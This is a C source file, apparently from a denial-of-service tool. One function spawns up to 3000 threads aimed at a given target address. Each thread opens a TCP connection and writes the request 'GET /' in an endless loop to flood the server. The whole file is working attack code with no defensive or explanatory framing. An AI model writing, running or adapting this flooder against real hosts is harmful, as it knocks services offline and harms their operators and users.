#include "getmassive.h"
void * getMassive(void * argv)
{
    struct argMassive targ =
            *(struct argMassive *)argv;
    char * str = targ.addr;
    int pth = targ.pt;
    pthread_t * arrayPth=targ.arrPth;
    if(pth<=0 || pth >= 3000)
        err_sys("Error number of pthreds:");

//    printf("getMassive\n"
//           "target:%s, pthreads:%d\n",str,pth);
    int pthreadResult;
    pthread_t thread;
    int i;
    for(i=0; i<pth;++i)
    {
        pthreadResult=pthread_create(&thread,NULL,&getMassivePthread,str);
        arrayPth[i]=thread;
        if(pthreadResult!=0)
            err_sys("Error pthread: %d",i);
    }
    return NULL;
}
void * getMassivePthread(void * argv)
{
    int connfd;
    struct sockaddr_in servaddr;
    char buffer[MAXLINE];
    strcpy(buffer,"GET /\n");
    ssize_t sizebuffer=strlen(buffer);

    connfd=Socket(AF_INET,SOCK_STREAM,0);
    bzero(&servaddr,sizeof(servaddr));
    servaddr.sin_family=AF_INET;
    servaddr.sin_port=htons(MYPORT);
    Inet_pton(AF_INET,(char *)argv,&servaddr.sin_addr);
    Connect(connfd,(SA *)&servaddr,sizeof(servaddr));

    while(1)
        write(connfd,buffer,sizebuffer);

    close(connfd);
    return NULL;
}
